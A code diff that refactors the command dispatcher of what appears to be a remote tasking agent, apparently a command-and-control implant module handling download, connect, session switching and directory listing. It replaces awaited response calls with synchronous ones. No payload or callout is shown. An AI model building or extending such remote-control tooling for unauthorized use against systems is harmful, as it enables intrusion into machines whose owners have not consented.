@@ -43,7 +43,7 @@ namespace Agent
                 {
                     case "upload":
                         //return RunCommand(args);
-                        await messageManager.AddResponse(new TaskResponse
+                        messageManager.AddTaskResponse(new TaskResponse
                         {
                             task_id = job.task.id,
                             user_output = "Not available currently.",
@@ -52,22 +52,22 @@ namespace Agent
                         });
                         break;
                     case "download":
-                        await messageManager.AddResponse(DownloadFile(args, job.task.id));
+                        messageManager.AddTaskResponse(DownloadFile(args, job.task.id));
                         break;
                     case "connect":
-                        await messageManager.AddResponse(Connect(args, job.task.id));
+                        messageManager.AddTaskResponse(Connect(args, job.task.id));
                         break;
                     case "disconnect":
-                        await messageManager.AddResponse(Disconnect(args, job.task.id));
+                        messageManager.AddTaskResponse(Disconnect(args, job.task.id));
                         break;
                     case "list-sessions":
-                        await messageManager.AddResponse(ListSessions(args, job.task.id));
+                        messageManager.AddTaskResponse(ListSessions(args, job.task.id));
                         break;
                     case "switch-session":
                         if (!string.IsNullOrEmpty(args["args"]))
                         {
                             currentSession = args["args"];
-                            await messageManager.AddResponse(new TaskResponse
+                            messageManager.AddTaskResponse(new TaskResponse
                             {
                                 task_id = job.task.id,
                                 user_output = $"Switched session to: {currentSession}",
@@ -76,7 +76,7 @@ namespace Agent
                         }
                         else
                         {
-                            await messageManager.AddResponse(new TaskResponse
+                            messageManager.AddTaskResponse(new TaskResponse
                             {
                                 task_id = job.task.id,
                                 user_output = "No valid session specified",
@@ -86,16 +86,16 @@ namespace Agent
                         }
                         break;
                     case "ls":
-                        await messageManager.AddResponse(ListDirectories(args, job.task.id));
+                        messageManager.AddTaskResponse(ListDirectories(args, job.task.id));
                         break;
                     case "cd":
-                        await messageManager.AddResponse(ChangeDirectory(args, job.task.id));
+                        messageManager.AddTaskResponse(ChangeDirectory(args, job.task.id));
                         break;
                     case "pwd":
-                        await messageManager.AddResponse(GetCurrentDirectory(args, job.task.id));
+                        messageManager.AddTaskResponse(GetCurrentDirectory(args, job.task.id));
                         break;
                     default:
-                        await messageManager.AddResponse(new TaskResponse
+                        messageManager.AddTaskResponse(new TaskResponse
                         {
                             task_id = job.task.id,
                             user_output = "No valid action specified",
@@ -108,7 +108,7 @@ namespace Agent
             }
             catch (Exception e)
             {
-                await messageManager.Write(e.ToString(), job.task.id, true, "error");
+                messageManager.Write(e.ToString(), job.task.id, true, "error");
                 return;
             }
         }
